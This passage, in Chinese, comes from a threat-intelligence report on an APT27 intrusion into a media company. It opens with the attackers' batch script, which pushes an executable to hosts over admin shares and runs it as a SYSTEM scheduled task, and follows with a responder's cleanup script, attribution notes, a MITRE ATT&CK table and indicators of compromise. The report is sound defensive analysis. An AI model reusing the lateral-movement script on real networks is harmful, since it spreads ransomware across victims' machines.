    @echo off
    for /f %%i in (c:\programdata\list.txt) do (
    net use \\%%i\c$  "*" /u:*\administrator
    copy c:\programdata\vmnat.exe \\%%i\c$\windows\system32\vmnat.exe
    SCHTASKS /Create /S %%i /u *\administrator /p "*" /tn * /tr "cmd.exe /c start c:\windows\system32\vmnat.exe" /sc onstart /RU SYSTEM
    schtasks /run /S %%i /u *\administrator /p "*" /tn *
    net use \\%%i\c$ /del
    net use * /del /Y
    )
    del vmnat.exe
    del list.txt
    del work.bat
这是用于在2020年从计算机列表中自动删除勒索软件的脚本：
    @echo off
    for /f %%i in (c:\programdata\list.txt) do (
       net use  \\%%i\c$ "*" /u:*\*
       if not errorlevel 1 (
         del \\%%i\c$\programdata\GameuxInstallHelper.dll
         del \\%%i\c$\programdata\GDFInstall.exe
         del \\%%i\c$\programdata\Sysurl.Hex
         net use \\%%i\c$ /del
      )ELSE (
        echo not access %%i >> c:\programdata\no_access.txt
      )
    )
（我们将敏感信息替换为“*”）
这些脚本在结构上显示出某些相似之处，并且在同一路径上具有相同的文件行循环。另一方面，缩进、脚本任务和文件命名是不同的。有些命令过于笼统，无法分辨，因为它们可以在在线搜索结果中找到并重新使用。
### 4.SysUpdate和hyperro后门的主体
在某些情况下，我们无法根据木马本身来确认特定后门的存在。我们根据独特的文件名和其他已确认的工具，确定了已在2018年使用的Superpro后门。我们通过查看进程转储内存中的C2地址和后门，确认了2020年使用的SysUpdate后门，这些地址和后门是在调查期间从一个与我们的客户无关的组织上传到[VirusTotal](https://www.virustotal.com/gui/file/b645ff7ca1bce2a9449bcf7378895022170ec8adba62ccf528e453667da2210a/details
"VirusTotal")的。
综上所述，这些相似之处可以指定APT27是罪魁祸首，但并不完全绝对。
### 结论
在本文中，我们描述了针对一家媒体公司的APT27攻击。这些网络犯罪分子通过在外国的一个办公室进入了该公司的总部。他们对基础设施的控制维持了两年。他们使用了曾经见过的公开可用和定制开发的工具。黑客们虽然没有改变他们的TTP，却选择了相当不寻常的软件来获利。用户数据被加密后，赎金要求被提出。勒索软件加密算法中的一个错误使我们得以恢复加密的文件。据我们所知，攻击者没有获得任何有价值的信息。
### MITRE TTPs
Tactic | ID | Name  
---|---|---  
Initial Access | T1190 | Exploit Public-Facing Application  
| T1199 | Trusted Relationship  
Execution | T1059 | Command and Scripting Interpreter: Windows Command Shell  
| T1053 | Scheduled Task/Job: Scheduled Task  
| T1047 | Windows Management Instrumentation  
Persistence | T1547 | Boot or Logon Autostart Execution: Registry Run Keys /
Startup Folder  
| T1574 | Hijack Execution Flow: DLL Search Order Hijacking  
| T1053 | Scheduled Task/Job: Scheduled Task  
| T1078 | Valid Accounts: Domain Accounts  
| T1078 | Valid Accounts: Default Accounts  
Privilege Escalation | T1068 | Exploitation for Privilege Escalation  
Defense Evasion | T1140 | Deobfuscate/Decode Files or Information  
| T1070 | Indicator Removal on Host: Clear Windows Event Logs  
| T1070 | Indicator Removal on Host: File Deletion  
| T1070 | Indicator Removal on Host: Timestomp  
Credential Access | T1003 | OS Credential Dumping: LSASS Memory  
Discovery | T1087 | Account Discovery: Domain Account  
| T1082 | System Information Discovery  
| T1049 | System Network Connections Discovery  
Lateral Movement | T1210 | Exploitation of Remote Services  
| T1570 | Lateral Tool Transfer  
| T1021 | Remote Services: SMB/Windows Admin Shares  
Collection | T1560 | Archive Collected Data: Archive via Utility  
| T1005 | Data from Local System  
| T1119 | Automated Collection  
| T1039 | Data from Network Shared Drive  
Command and Control | T1071 | Application Layer Protocol: Web Protocols  
| T1132 | Data Encoding: Standard Encoding  
| T1573 | Encrypted Channel: Symmetric Cryptography  
Exfiltration | T1020 | Automated Exfiltration  
| T1041 | Exfiltration Over C2 Channel  
Impact | T1486 | Data Encrypted for Impact  
### IOCs
**ChinaChopper:**
2ce60073c09887f9e3a482097294e17d  
5bc0d6918e03a92f04b3dfc21b619c7f  
73717a2f9bfe19ccdad541bec1fa2b69  
82a8470534d74c9c5c0d84071eb0a703  
b89e96e2ea8dd6fdb438f7d5b8ecf60c
**TwoFace:**
581c331d41ef5f5df99ae0d16b2cebf0  
ff2693903a1049984745e79381e9ed7e
**SysUpdate:**
3c1981991cce3b329902288bb2354728  
43a2c2fb8d52dc1835ac18516b13aff1  
4b5484e3de5c5a2e60fcee50d04183d6
**SysUpdate C &C:**
103.59.144[.]183（[ZoomEye搜索结果](https://www.zoomeye.org/searchResult?q=103.59.144.183
"ZoomEye搜索结果")）  
95.179.189[.]33（[ZoomEye搜索结果](https://www.zoomeye.org/searchResult?q=95.179.189.33
"ZoomEye搜索结果")）
**NBTScan:**
f01a9a2d1e31332ed36c1a4d2839f412
**SMBTouch:**
b50fff074764b3a29a00b245e4d0c863
**PsExec:**
aeee996fd3484f28e5cd85fe26b6bdcd
**Termite:**
dc92496358b8e67568a35b861ba1804e39e3d36b
**Dsquery:**
3583d7c971de148a1ffb3302d1510ef1
**EternalBlue:**
8c80dd97c37525927c1e549cb59bcbf3
**frsocks:**
da0c13d834cafc010bec1afa2d76196ced71e661
**Mimikatz:**
449da3d7405c2c79fa55bd7973096e28  
0078ff05c20689f40ea9cb8c47fcfb2e52cdc3a9
**BitMiner:**
5430039162e58c44f9a5941295b55fba
**Polar:**
841980b4ae02a4e6520ab834deee241b
* * *